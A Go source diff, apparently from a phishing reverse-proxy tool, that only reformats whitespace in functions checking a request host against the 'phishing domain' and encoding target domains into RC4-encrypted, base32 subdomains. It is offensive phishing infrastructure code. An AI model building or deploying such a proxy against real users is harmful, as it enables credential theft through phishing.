@@ -150,7 +150,7 @@ func IsValidRequestHost(host string, phishdomain string) bool {
 		return true
 	}
 
-	if strings.Contains(host, phishdomain) == false && DynamicMode == false{
+	if strings.Contains(host, phishdomain) == false && DynamicMode == false {
 		log.Warningf("Host %s does not contain the phishing domain", host)
 		return false
 	}
@@ -158,7 +158,7 @@ func IsValidRequestHost(host string, phishdomain string) bool {
 	return true
 }
 
-func EncodeSubdomain(domain string,TLSValue bool) (encoded string, err error) {
+func EncodeSubdomain(domain string, TLSValue bool) (encoded string, err error) {
 
 	c, err := rc4.NewCipher([]byte(RC4_KEY))
 	if err != nil {
@@ -166,12 +166,12 @@ func EncodeSubdomain(domain string,TLSValue bool) (encoded string, err error) {
 		return "", err
 	}
 
-	if  ForceHTTPS == true || ForceHTTP == true {
+	if ForceHTTPS == true || ForceHTTP == true {
 		//check and replace TLS context for TLS and clear-text wrapper mode based on a MAGIC char
 		if TLSValue == true {
-			domain = TLS_DOMAIN_MAGIC_CHAR+domain
+			domain = TLS_DOMAIN_MAGIC_CHAR + domain
 		} else if TLSValue == false {
-			domain = CLEAR_TEXT_DOMAIN_MAGIC_CHAR+domain
+			domain = CLEAR_TEXT_DOMAIN_MAGIC_CHAR + domain
 		}
 	}
 
@@ -190,25 +190,24 @@ func DecodeSubdomain(encodedDomain string) (domain string, FoundTlsMark bool, is
 	c, err := rc4.NewCipher([]byte(RC4_KEY))
 	if err != nil {
 		log.Errorf("DecodeSubdomain error: %s", err)
-		return "",false,false, err
+		return "", false, false, err
 	}
 
 	src, err := base32.DecodeString(encodedDomain)
 	if err != nil {
-		return "", false,false,err
+		return "", false, false, err
 	}
 
 	c.XORKeyStream(src, src)
 	src, err = smaz.Decompress(src)
 	if err != nil {
 		log.Errorf("DecodeSubdomain error: %s", err)
-		return "",false,false, err
+		return "", false, false, err
 	}
 
-
 	if ForceHTTP == true || ForceHTTPS == true {
- 	//check and replace TLS context for TLS and clear-text wrapper mode based on a MAGIC char
- 		if TLS_DOMAIN_MAGIC_CHAR == string(src[0]) {
+		//check and replace TLS context for TLS and clear-text wrapper mode based on a MAGIC char
+		if TLS_DOMAIN_MAGIC_CHAR == string(src[0]) {
 			new_tls = true
 			tls_value = true
 			src = src[1:]
@@ -221,15 +220,15 @@ func DecodeSubdomain(encodedDomain string) (domain string, FoundTlsMark bool, is
 			log.Debugf("DecodeSubdomain: CLEAR_TEXT_DOMAIN_MAGIC_CHAR found")
 
 		} else {
-		log.Debugf("DecodeSubdomain: NO MAGIC CHAR found")
+			log.Debugf("DecodeSubdomain: NO MAGIC CHAR found")
 		}
 	}
 
 	if RegexpSubdomain.MatchString(string(src)) == false {
 		log.Warningf(" DecodeSubdomain: domain [%s] contains invalid characters", string(src))
-		return "",new_tls,tls_value, errors.New("DecodeSubdomain contains invalid characters ")
+		return "", new_tls, tls_value, errors.New("DecodeSubdomain contains invalid characters ")
 	}
 
 	log.Debugf("DecodeSubdomain: %s", string(src))
-	return string(src), new_tls,tls_value,nil
+	return string(src), new_tls, tls_value, nil
 }
